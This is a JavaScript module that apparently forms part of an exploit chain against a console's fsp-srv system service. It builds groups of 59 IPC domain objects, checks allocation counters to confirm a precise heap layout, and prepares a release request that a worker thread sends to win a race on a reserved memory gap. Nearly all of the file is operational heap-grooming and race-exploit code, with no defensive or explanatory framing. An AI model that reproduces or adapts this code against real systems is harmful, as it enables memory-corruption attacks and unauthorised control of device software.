/*
 * Reservation groups for the reserved-gap race.
 *
 * Every wave gets a fresh fsp-srv domain session holding 59 cmd-1200 objects.
 * Reads globals from sessions.js, transport.js, decode.js, format.js, and
 * frameArgSlot in orchestration.js.
 */

// Worker slot that sends the release request for its reservation group.
const RELEASE_SLOT = 9;

// Read the 16 allocation counters with cmd 1009, twice so the values are fresh.
function readAllocationCounters(session, pktBuf) {
    var latest = null;
    for (var pass = 0; pass < 2; pass++) {
        prepPacket(pktBuf, 4, 8, [[16, 0x49434653], [24, 1009]]);
        sendIPC(session, pktBuf);
        var reply = cmifReply(pktBuf);

        if (reply.result !== 0) {
            return null;
        }

        latest = [];
        for (var i = 0; i < 16; i++) {
            latest.push(Number(read64(pktBuf + BigInt(reply.data + i * 8))));
        }
    }
    return latest;
}

// Close a domain object right away with a type-2 domain message.
function closeDomainObjectNow(sessionHandle, objectId, pktBuf) {
    if (!sessionHandle || !objectId) {
        return 0xFFFFFFFF;
    }

    writeDomainRequestHeader(pktBuf, objectId);
    return Number(sendIPC(sessionHandle, pktBuf)) >>> 0;
}

/*
 * Close a group that has not been wrapped yet. If individual CloseObject requests
 * fail, closing the owner session still releases its domain table and whatever
 * objects are left in it.
 */
function closeUnwrappedReservationGroup(sessionHandle, rootCopy,
                                        reservationObjectIds, pktBuf) {
    for (var i = reservationObjectIds.length - 1; i >= 0; i--) {
        closeDomainObjectNow(sessionHandle, reservationObjectIds[i], pktBuf);
    }

    if (rootCopy) {
        closeHandle(rootCopy);
    }

    if (sessionHandle) {
        closeHandle(sessionHandle);
    }
}

/**
 * Open a fresh domain session holding `count` cmd-1200 reservations, then validate
 * it.
 *
 * @param {number} readerSession Session used to read allocation counters.
 * @param {bigint} pktBuf Reusable IPC packet buffer.
 * @param {number} [count=59] Number of reservations to create.
 * @returns {object} Group handles, allocation counters, retry diagnostics, or an error.
 */
function openReservationGroup(readerSession, pktBuf, count) {
    count = count || 59;
    var expectedAllocation = count * 208;
    var maxGroupAttempts = 3;

    for (var attempt = 1; attempt <= maxGroupAttempts; attempt++) {
        var sessionHandle = openFspSession();

        if (!sessionHandle) {
            return { ok: false, error: "open fsp-srv" };
        }

        // Convert to domain.
        prepPacket(pktBuf, 5, 8, [[16, 0x49434653], [24, 0], [32, 0]]);
        sendIPC(sessionHandle, pktBuf);
        var converted = cmifReply(pktBuf);
        var rootObj = converted.result === 0
            ? (Number(read32(pktBuf + BigInt(converted.data))) >>> 0) : 0;

        if (!rootObj) {
            closeHandle(sessionHandle);
            return { ok: false, error: "ConvertToDomain SFCO=" + hex32(converted.result) };
        }

        // Keep a plain copy of the root object alive alongside it.
        prepPacket(pktBuf, 5, 9, [[16, 0x49434653], [24, 1], [32, rootObj]]);
        sendIPC(sessionHandle, pktBuf);
        var copiedRoot = cmifReply(pktBuf);
        var rootCopy = copiedRoot.result === 0 && copiedRoot.moves.length
            ? copiedRoot.moves[0] : 0;

        if (!rootCopy) {
            closeHandle(sessionHandle);
            return { ok: false, error: "CopyFromCurrentDomain SFCO=" + hex32(copiedRoot.result) };
        }

        /*
         * Measure only after the session and domain setup, so the delta covers the
         * cmd-1200 objects alone. That matches the reference's 59 times 208-byte
         * check.
         */
        var before = readAllocationCounters(readerSession, pktBuf);

        if (before === null) {
            closeHandle(rootCopy);
            closeHandle(sessionHandle);
            return { ok: false, error: "allocation counters unavailable before reservations",
                attempts: attempt };
        }

        /*
         * Create N cmd-1200 objects. A response only counts when it carries one
         * nonzero domain object id, because anything else cannot back a usable
         * reservation group.
         */
        var reservationObjectIds = [];
        var reservationSuccessCount = 0;
        var reservationFailures = [];
        var reservationFailureCount = 0;
        for (var i = 0; i < count; i++) {
            prepPacket(pktBuf, 4, 12, [
                [16, 1], [18, 0x10], [20, rootObj],
                [32, 0x49434653], [40, 1200]
            ]);
            write16(pktBuf + 0x12n, 16n);
            var transport = Number(sendIPC(sessionHandle, pktBuf)) >>> 0;

            if (transport !== 0) {
                reservationFailureCount++;

                if (reservationFailures.length < 4) {
                    reservationFailures.push("#" + i + ":transport=" + hex32(transport));
                }

                continue;
            }

            var result = Number(read32(pktBuf + 0x28n)) >>> 0;
            var objectCount = Number(read32(pktBuf + 0x10n)) >>> 0;
            var objectId = Number(read32(pktBuf + 0x30n)) >>> 0;

            if (result === 0 && objectCount === 1 && objectId !== 0) {
                reservationSuccessCount++;
                reservationObjectIds.push(objectId);
            } else {
                reservationFailureCount++;

                if (reservationFailures.length < 4) {
                    reservationFailures.push("#" + i + ":sfco=" + hex32(result) + ",objects=" + objectCount + ",id=" + hex32(objectId));
                }
            }
        }

        var held = readAllocationCounters(readerSession, pktBuf);
        var allocationDelta = before && held
            ? before[5] - held[5] : null;
        var reservationsComplete = reservationSuccessCount === count &&
            reservationObjectIds.length === count &&
            reservationFailureCount === 0;
        var countersAvailable = before !== null && held !== null;

        /*
         * A partial group cannot back a valid wave, so close it and retry with a
         * fresh session. No worker has started yet, so no wave state is live.
         */
        if (!reservationsComplete || !countersAvailable) {
            closeUnwrappedReservationGroup(sessionHandle, rootCopy,
                                           reservationObjectIds, pktBuf);

            if (!reservationsComplete && attempt < maxGroupAttempts) {
                continue;
            }

            return {
                ok: false,
                error: !reservationsComplete
                    ? "cmd-1200 reservations=" + reservationSuccessCount + "/" + count + " failures=" + reservationFailureCount +
                        " after " + attempt + " attempts"
                    : "allocation counters unavailable",
                reserved: reservationSuccessCount,
                failures: reservationFailures,
                before: before, held: held, allocationDelta: allocationDelta,
                attempts: attempt
            };
        }

        if (allocationDelta !== expectedAllocation) {
            var allocationError = "allocation delta=0x" +
                Number(allocationDelta).toString(16) + " expected=0x" +
                expectedAllocation.toString(16);
            closeUnwrappedReservationGroup(sessionHandle, rootCopy,
                                           reservationObjectIds, pktBuf);

            if (attempt < maxGroupAttempts) {
                continue;
            }

            return {
                ok: false, error: allocationError + " after " + attempt + " attempts",
                reserved: reservationSuccessCount,
                failures: reservationFailures,
                before: before, held: held, allocationDelta: allocationDelta,
                attempts: attempt
            };
        }

        // Wrap the group only once it has passed both validations unwrapped.
        prepPacket(pktBuf, 5, 8, [[16, 0x49434653], [24, 0], [32, 0]]);
        sendIPC(sessionHandle, pktBuf);
        var wrapped = cmifReply(pktBuf);
        var outer = wrapped.result === 0
            ? (Number(read32(pktBuf + BigInt(wrapped.data))) >>> 0) : 0;

        if (!outer) {
            closeUnwrappedReservationGroup(sessionHandle, rootCopy,
                                           reservationObjectIds, pktBuf);
            return {
                ok: false, error: "group wrap SFCO=" + hex32(wrapped.result),
                reserved: reservationSuccessCount, failures: reservationFailures,
                before: before, held: held, allocationDelta: allocationDelta,
                attempts: attempt
            };
        }

        return {
            ok: true, session: sessionHandle, root: rootObj,
            rootCopy: rootCopy, outer: outer,
            reserved: reservationSuccessCount, failures: reservationFailures,
            before: before, held: held, allocationDelta: allocationDelta,
            attempts: attempt
        };
    }

    return { ok: false, error: "reservation accounting retries exhausted" };
}

// Close a reservation group: its domain object, then its session handle.
function closeReservationGroup(group, outerStillOpen, pktBuf) {
    if (!group) {
        return;
    }

    if (group.session && outerStillOpen && group.outer) {
        closeDomainObjectNow(group.session, group.outer, pktBuf);
    }

    if (group.rootCopy) {
        closeHandle(group.rootCopy);
    }

    if (group.session) {
        closeHandle(group.session);
    }
}

/*
 * Prepare the request the release worker sends. It addresses the group's outer
 * domain object and takes the group session as its first frame argument.
 *
 * The worker sends it at the wave's release point, so the group is released
 * in-band from a worker thread rather than from the payload thread.
 */
function prepareReleaseRequest(sendPkt, frames, sendIndices, group) {
    writeDomainRequestHeader(sendPkt, group.outer);
    write64(frameArgSlot(frames[RELEASE_SLOT].frame,
                         frames[RELEASE_SLOT].count, sendIndices[RELEASE_SLOT], 0),
            BigInt(group.session));
}
